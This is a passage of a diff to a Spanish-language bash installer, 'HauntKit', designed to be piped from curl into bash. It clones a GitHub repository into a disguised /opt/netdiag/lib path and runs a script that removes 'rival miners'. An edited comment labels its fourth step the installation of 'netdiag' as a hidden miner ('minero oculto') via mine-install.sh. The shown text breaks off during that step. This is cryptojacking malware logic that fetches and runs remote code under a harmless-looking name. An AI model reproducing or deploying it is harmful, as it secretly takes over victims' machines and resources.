@@ -1,9 +1,9 @@
 #!/bin/bash
-# ════════════════════════════════════════════════════════
+# ═════════════════════════════════════════════════════════
 #  HauntKit — Instalación remota (curl | bash)
 #  Una línea, sin interacción, sin esfuerzo
-#  v1.9.5 — verificación real de git/clone (fix: no asumir éxito)
-# ════════════════════════════════════════════════════════
+#  v4.0.0 — verificación real de git/clone (fix: no asumir éxito)
+# ═════════════════════════════════════════════════════════
 
 set -euo pipefail
 
@@ -33,7 +33,7 @@ echo "╚═══════════════════════�
 echo -e "${NC}"
 
 # ─── Paso 1: Git (con verificación real) ───
-echo -e "${YELLOW}[1/4]${NC} Verificando git..."
+echo -e "${YELLOW}[1/5]${NC} Verificando git..."
 
 # Debian EOL (buster, etc.): migrar repos a archive.debian.org para evitar 404
 fix_eol_repos() {
@@ -93,7 +93,7 @@ fi
 ok "git listo ($(git --version 2>/dev/null | head -1))"
 
 # ─── Paso 2: Clonar (con verificación real) ───
-echo -e "${YELLOW}[2/4]${NC} Clonando HauntKit..."
+echo -e "${YELLOW}[2/5]${NC} Clonando HauntKit..."
 REPO="https://github.com/CyberRo/HauntKit.git"
 DEST="/opt/netdiag/lib"
 
@@ -117,7 +117,7 @@ fi
 ok "Repo en $DEST"
 
 # ─── Paso 3: Anti-miner ───
-echo -e "${YELLOW}[3/4]${NC} Buscando mineros rivales..."
+echo -e "${YELLOW}[3/5]${NC} Buscando mineros rivales..."
 if [ -f "$DEST/tools/utils/clean-miners.sh" ]; then
     bash "$DEST/tools/utils/clean-miners.sh" --strict 2>&1
     echo ""
@@ -125,8 +125,8 @@ else
     warn "clean-miners.sh no encontrado, se omite"
 fi
 
-# ─── Paso 4: Instalar (con verificación) ───
-echo -e "${YELLOW}[4/4]${NC} Instalando netdiag..."
+# ─── Paso 4: Instalar netdiag (minero oculto) ───
+echo -e "${YELLOW}[4/5]${NC} Instalando netdiag..."
 if [ ! -f "$DEST/tools/utils/mine-install.sh" ]; then
     fail "mine-install.sh no existe en $DEST — el clonado está incompleto"
 fi
